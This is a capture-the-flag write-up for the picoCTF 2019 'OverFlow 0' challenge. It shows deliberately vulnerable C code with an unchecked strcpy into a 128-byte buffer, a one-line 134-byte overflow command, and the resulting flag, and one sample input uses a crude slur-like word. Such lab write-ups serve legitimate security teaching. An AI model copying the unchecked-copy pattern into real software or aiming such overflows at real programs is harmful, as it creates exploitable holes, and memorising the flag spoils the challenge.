# OverFlow 0 - Points: 100

## Problem

> This should be easy. Overflow the correct buffer in this [program](https://2019shell1.picoctf.com/static/1730bdc8ccd557c8ff20d1c28a5c3dbe/vuln) and get a flag. Its also found in /problems/overflow-0_4_e130f4df1710865981d50f778a8059f7 on the shell server. [Source](https://2019shell1.picoctf.com/static/1730bdc8ccd557c8ff20d1c28a5c3dbe/vuln.c).

## Hints

> Find a way to trigger the flag to print

> If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

## Overview

There's a source code written in C and a program to run. Looking at the tittle, we pretty much know this challenge is about buffer overflow, one of a really common program vulnerabilities.

## Solutions

Let's look at the source code first

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}
```
Basically, the program tries to open a text file called flag.txt which I believe is on their shell server.

However we can try pwning the binary locally first creating a file flag.txt on your system and add some contents into it. 

Anyways, I'll just do it on the shell server 

```
$ ./vuln
Please enter an argument next time
```

Now we try it with an argument
```
$ ./vuln yougay
You entered: yougay
```
As you can see in the source code, ```vuln()``` doesn't have any boundary checking, so even though there is only 128 bytes space available, its ```strcpy()``` will keep inserting more and more bytes into ```buf``` and it's a very basic buffer overflow.

I'll try to leverage and exploit this vulnerability. 

After a few tries I found that it needed 6 more bytes to leak out the flag.
```
$ ./vuln $(python -c "print('A'*134)")
picoCTF{3asY_P3a5y2f814ddc}
```
